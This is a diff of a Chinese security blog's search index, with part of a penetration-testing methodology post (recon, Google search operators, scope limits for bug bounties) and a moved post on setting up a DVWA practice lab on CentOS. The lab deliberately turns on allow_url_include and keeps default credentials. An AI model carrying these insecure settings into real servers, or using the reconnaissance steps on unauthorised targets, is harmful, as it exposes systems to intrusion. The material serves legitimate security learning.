-<td align="left">大型企业 ：股权信息搜集 <br>中型企业 ：域名 <br>小型企业 ：IP  信息<br><br>收集方式 <br>主动收集：<br>与目标交互，会记录自己的操作信息 <br>被动收集：<br>不与目标交互，搜索引擎等工具  <br><br><strong>谷歌语法</strong> <br>site:找到与指定网站有联系的URL <br>inurl：将返回url中含有关键词的网页 <br>allinurl：与inurl类似，可以指定多个词 <br>intext：寻找正文中含有关键字的网页 <br>allintext：寻找正文中的多个关键字 <br>intitle：寻找标题中含有关键字的网页 <br>allintitle：寻找标题中的多个关键字 <br>filetype：指定访问的文件类型  <br><br>符号使用 <br>1、精确搜索： <br>给关键词加上双引号实现精确匹配双引号内的字符 <br><br>2、通配符： <br>谷歌的通配符是星号<code>&quot;*&quot;</code>，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词 <br><br>3、点号匹配任意字符： <br>点号<code>&quot;.&quot;</code>匹配的是匹配某个字符，不是字、短语等内容。 <br><br>4、基本搜索符号约束： <br>加号<code>&quot;+&quot;</code>用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加<code>&quot;-&quot;</code>减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。 <br><br>5、数字范围：<br>用两个点号<code>&quot;..&quot;</code>表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索如：手机2000..3000元，注意“3000”与“元”之间必须有空格<br><br>6、布尔逻辑：<br>或，符号`”</td>
-</tr>
-<tr>
-<td align="left">威胁建模</td>
-<td align="left">建立excle表格，进行信息整理，初步猜测可能存在的漏洞点 域名、IP、端口、中间件等</td>
-</tr>
-<tr>
-<td align="left">渗透测试</td>
-<td align="left">top10漏洞、cms漏洞等 <br>注意： <br>挖src时，只允许到此截断，且webshell只允许输出提示语句（echo ‘ok’等）； <br>xss只允许使用console.log(/xss/)等 …</td>
-</tr>
-<tr>
-<td align="left">后渗透测试</td>
-<td align="left">有指向性的获取目标数据（狭义上：内网渗透）</td>
-</tr>
-<tr>
-<td align="left">报告截断</td>
-<td align="left">撰写报告</td>
-</tr>
-</tbody></table>
-<p>其他：</p>
-<p>注册网站信息查询</p>
-<p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p>
-<p>网站监测</p>
-<p><a href="https://anquan.baidu.com/product/secindex?industry=total">https://anquan.baidu.com/product/secindex?industry=total</a></p>
-<p>DNS信息</p>
-<p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
-<p>whoami信息</p>
-<p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
-<p>网站指纹信息</p>
-<p><a href="https://www.godeye.vip/">https://www.godeye.vip/</a></p>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -7816,57 +7816,6 @@
       </tags>
   </entry>
   <entry>
-    <title>搭建综合靶场</title>
-    <url>/article/%E6%90%AD%E5%BB%BA%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>渗透学习中经常会用到到靶场，这里综合了几个常用的靶场，分享一下。</p>
-<h1 id="二、搭建"><a href="#二、搭建" class="headerlink" title="二、搭建"></a>二、搭建</h1><p>搭建在centos中，主要是对DVWA做配置</p>
-<h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<p>启动apache并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
-
-<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<p>启动Mysql并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
-
-<p>配置Mysql数据库</p>
-<p>初始化mysql数据库（全部回车确认）</p>
-<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
-
-<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<p>重启apache使php生效（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<p>配置</p>
-<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
-
-<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
-
-<p>解压并复制到/var/www/html目录</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
-
-<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http://虚拟机IP</span><br></pre>
-
-<p>sql-lab和dvwa都需要初始化</p>
-<p>DVWA密码 admin:password</p>
-<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Env/a.gz.tar">https://www.zerochen.top/download/Env/a.gz.tar</a></p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>综合靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>搭建hexo博客</title>
     <url>/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Github Pages</p>
@@ -8034,6 +7983,57 @@
       </categories>
       <tags>
         <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建综合靶场</title>
+    <url>/article/%E6%90%AD%E5%BB%BA%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>渗透学习中经常会用到到靶场，这里综合了几个常用的靶场，分享一下。</p>
+<h1 id="二、搭建"><a href="#二、搭建" class="headerlink" title="二、搭建"></a>二、搭建</h1><p>搭建在centos中，主要是对DVWA做配置</p>
+<h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<p>启动apache并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
+
+<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+<p>启动Mysql并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
+
+<p>配置Mysql数据库</p>
+<p>初始化mysql数据库（全部回车确认）</p>
+<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
+
+<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<p>重启apache使php生效（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<p>配置</p>
+<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
+
+<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
+
+<p>解压并复制到/var/www/html目录</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
+
+<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http://虚拟机IP</span><br></pre>
+
+<p>sql-lab和dvwa都需要初始化</p>
+<p>DVWA密码 admin:password</p>
+<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Env/a.gz.tar">https://www.zerochen.top/download/Env/a.gz.tar</a></p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>综合靶场</tag>
       </tags>
   </entry>
   <entry>
